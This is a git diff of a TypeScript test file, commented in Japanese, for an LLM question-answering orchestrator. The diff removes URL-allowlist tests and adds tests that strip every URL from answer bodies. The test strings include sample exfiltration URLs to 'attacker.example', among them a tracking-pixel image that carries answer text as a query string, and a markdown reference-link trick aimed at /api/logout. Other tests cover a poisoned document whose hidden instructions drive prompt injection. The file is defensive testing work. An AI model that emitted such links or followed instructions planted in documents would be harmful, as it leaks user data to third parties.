@@ -2,8 +2,10 @@
  * 受け入れ条件2: 出典のない断定文を返さない。
  * - citations は run 内で実際に受け取った documentId に限る(見たことのない ID は除外、
  *   0件になれば unresolved + 注意書き + confidence ≤ 0.3)
- * - 回答文中の URL は run 内で受け取った原典の url 以外を除去する(RS-4 / TM-D2)
- * - 文書内の指示(隠しコメント含む)に従った回答が来ても、出典・URL の検証で無害化される(RS-3)
+ * - 回答本文には URL を一切残さず、原典へのリンクは citations[].url だけが運ぶ
+ *   (RS-4 / TM-D2、セキュリティレビュー M1。無害化の単体テストは test/sanitize.test.ts)
+ * - 文書内の指示(隠しコメント含む)に従った回答が来ても、出典の検証と本文の無害化で
+ *   無害化される(RS-3)
  */
 import { afterEach, describe, expect, it } from "vitest";
 import {
@@ -14,7 +16,7 @@ import {
   REMOVED_URL_MARKER,
   ScriptedLlmClient,
   TOOL_RESULT_PREFACE,
-  sanitizeAnswerUrls,
+  findUrlLikeSpans,
   scriptedSubmit,
   scriptedToolUse,
   verifyCitations,
@@ -24,6 +26,7 @@ import {
   EXPENSE_POLICY,
   startGateway,
   type GatewayHarness,
+  TEST_DOC_ID_AUDIT,
 } from "./helpers/harness.js";
 import { firstHit } from "./helpers/script.js";
 
@@ -93,49 +96,6 @@ describe("verifyCitations(証拠台帳による出典の検証)", () => {
   });
 });
 
-describe("sanitizeAnswerUrls(回答文中の URL の検証)", () => {
-  const allowed = new Set([
-    "https://alpha.example.test/docs/doc-1",
-    "https://wiki.example.test/ページ",
-  ]);
-
-  it("原典の URL は形式(裸・Markdown リンク・句読点付き)を問わず残す", () => {
-    const text = [
-      "詳細は https://alpha.example.test/docs/doc-1 を参照。",
-      "[経費精算規程](https://alpha.example.test/docs/doc-1)",
-      "(https://alpha.example.test/docs/doc-1)",
-      "https://alpha.example.test/docs/doc-1。",
-      "https://wiki.example.test/%E3%83%9A%E3%83%BC%E3%82%B8",
-    ].join("\n");
-    expect(sanitizeAnswerUrls(text, allowed)).toEqual({ text, removed: 0 });
-  });
-
-  it("原典以外の URL を除去する(裸の URL・www・リンク先・画像)", () => {
-    const text = [
-      "こちら https://attacker.example/collect?d=secret も参照。",
-      "www.attacker.example/x にもある。",
-      "[規程](https://attacker.example/phish)",
-      "![](https://attacker.example/pixel.png?q=経費精算の締め日は25日)",
-      "<img src=\"https://attacker.example/i.png\">",
-    ].join("\n");
-    const result = sanitizeAnswerUrls(text, allowed);
-    expect(result.removed).toBe(5);
-    expect(result.text).not.toContain("attacker.example");
-    expect(result.text).toContain(`こちら ${REMOVED_URL_MARKER} も参照。`);
-    expect(result.text).toContain(`規程${REMOVED_URL_MARKER}`);
-  });
-
-  it("原典の URL を前置きにした別の URL は通さない", () => {
-    const result = sanitizeAnswerUrls(
-      "https://alpha.example.test/docs/doc-1.attacker.example/steal と https://alpha.example.test/docs/doc-1/../../x",
-      allowed,
-    );
-    expect(result.removed).toBe(2);
-    expect(result.text).not.toContain("attacker.example");
-    expect(result.text).not.toContain("alpha.example.test");
-  });
-});
-
 describe("受け入れ条件2: シナリオ(実 Gateway)", () => {
   async function setup(documents = [EXPENSE_POLICY]) {
     const alpha = new CorpusConnector("alpha", documents);
@@ -155,7 +115,7 @@ describe("受け入れ条件2: シナリオ(実 Gateway)", () => {
           confidence: 0.95,
         }),
     ]);
-    const orchestrator = new Orchestrator({ llm, auditLogger: harness.auditLogger });
+    const orchestrator = new Orchestrator({ llm, auditLogger: harness.auditLogger, docIdAudit: TEST_DOC_ID_AUDIT });
 
     const answer = await orchestrator.run({
       question: "経費精算の締め日は?",
@@ -193,7 +153,7 @@ describe("受け入れ条件2: シナリオ(実 Gateway)", () => {
         });
       },
     ]);
-    const orchestrator = new Orchestrator({ llm, auditLogger: harness.auditLogger });
+    const orchestrator = new Orchestrator({ llm, auditLogger: harness.auditLogger, docIdAudit: TEST_DOC_ID_AUDIT });
 
     const answer = await orchestrator.run({
       question: "経費精算の締め日は?",
@@ -207,7 +167,7 @@ describe("受け入れ条件2: シナリオ(実 Gateway)", () => {
     expect(answer.warnings).toHaveLength(1);
   });
 
-  it("文書内の指示(隠しコメント含む)に従った回答でも、原典以外の URL は除去される(RS-3 / RS-4)", async () => {
+  it("文書内の指示(隠しコメント含む)に従った回答でも、本文に URL を残さず原典のリンクは出典だけが運ぶ(RS-3 / RS-4)", async () => {
     const poisoned = {
       id: "doc-poisoned",
       title: "経費精算FAQ",
@@ -253,7 +213,7 @@ describe("受け入れ条件2: シナリオ(実 Gateway)", () => {
         });
       },
     ]);
-    const orchestrator = new Orchestrator({ llm, auditLogger: harness.auditLogger });
+    const orchestrator = new Orchestrator({ llm, auditLogger: harness.auditLogger, docIdAudit: TEST_DOC_ID_AUDIT });
 
     const answer = await orchestrator.run({
       question: "経費精算の締め日は?",
@@ -264,9 +224,55 @@ describe("受け入れ条件2: シナリオ(実 Gateway)", () => {
     expect(sawDataDelimiting).toBe(true);
     expect(answer.outcome).toBe("resolved");
     expect(answer.answer).not.toContain("attacker.example");
-    expect(answer.answer).toContain("[FAQ](https://alpha.example.test/docs/doc-poisoned)");
+    // 原典の URL も本文には残さない(M1)。リンクはテキストだけになる
+    expect(answer.answer).not.toContain("alpha.example.test");
+    expect(answer.answer).not.toMatch(/!\[|\]\(/);
+    expect(findUrlLikeSpans(answer.answer)).toEqual([]);
+    expect(answer.answer).toContain("経費精算の締め日は毎月25日です(FAQ)。");
+    expect(answer.answer).toContain(`詳しくは ${REMOVED_URL_MARKER} を見てください。`);
+    // 原典へのリンクは citations[].url(ツール結果の値)だけが運ぶ
+    expect(answer.citations).toEqual([
+      {
+        documentId: "doc-poisoned",
+        sourceId: "alpha",
+        title: "経費精算FAQ",
+        url: "https://alpha.example.test/docs/doc-poisoned",
+      },
+    ]);
     expect(answer.warnings).toContain(
-      "回答に含まれていた、検索結果の原典以外の URL 2 件を除去しました。",
+      "回答本文に含まれていたリンク・画像・HTML・URL 3 件を除去しました(原典へのリンクは出典の url を参照してください)。",
+    );
+  });
+
+  it("最終検証で除去したものは warnings に別に記録する(fail-closed、M1 手順5)", async () => {
+    const { harness } = await setup();
+    const llm = new ScriptedLlmClient([
+      () => scriptedToolUse([{ name: "search", input: { source: "alpha", query: "締め日" } }]),
+      (context) => {
+        const hit = firstHit(context);
+        return scriptedSubmit({
+          // `<i>:</i>` を除くと参照定義が成立する(手順 2〜4 の後に現れる構文)
+          answer: "経費精算の締め日は毎月25日です。\n\n[r]<i>:</i> /api/logout\n\n[押す][r]",
+          citations: [{ documentId: hit.documentId, sourceId: hit.source }],
+          confidence: 0.9,
+        });
+      },
+    ]);
+    const orchestrator = new Orchestrator({
+      docIdAudit: TEST_DOC_ID_AUDIT,
+      llm,
+      auditLogger: harness.auditLogger,
+    });
+
+    const answer = await orchestrator.run({
+      question: "経費精算の締め日は?",
+      gateway: harness.client(),
+    });
+
+    expect(answer.answer).not.toContain("/api/logout");
+    expect(answer.answer.replace(/\n+/g, "\n")).toBe("経費精算の締め日は毎月25日です。\n押す");
+    expect(answer.warnings).toContain(
+      "最終検証で回答本文から URL・リンクらしき文字列 1 件を追加で除去しました。",
     );
   });
 });
